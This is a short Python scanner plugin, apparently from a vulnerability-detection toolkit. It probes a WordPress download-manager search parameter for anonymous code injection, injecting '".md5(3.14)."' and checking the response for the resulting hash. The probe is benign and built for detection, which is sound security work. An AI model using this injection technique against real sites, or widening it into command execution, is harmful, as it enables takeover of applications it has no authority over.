# !usr/bin/dev python
# encoding = utf-8

import re
"""
desc:
The code injection vulnerability has been found and confirmed within the software as an
anonymous user. A successful attack could allow an anonymous attacker gains full control
of the application and the ability to use any operating system functions that are available
to the scripting environment.
reference:
http://1337day.com/exploit/22907
http://www.beebeeto.com/pdb/poc-2014-0155/
"""


def assign(service, arg):
    if service == 'wordpress':
        return True, arg
    pass


def audit(arg):
    target_url = arg
    payload = '/cmdownloads/?CMDsearch=".md5(3.14)."'
    target_url += payload
    code, head, res, errcode, finalurl = curl.curl(target_url)
    if '4beed3b9c4a886067de0e3a094246f78' in res:
        security_hole(target_url)
    pass

if __name__ == "__main__":
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])
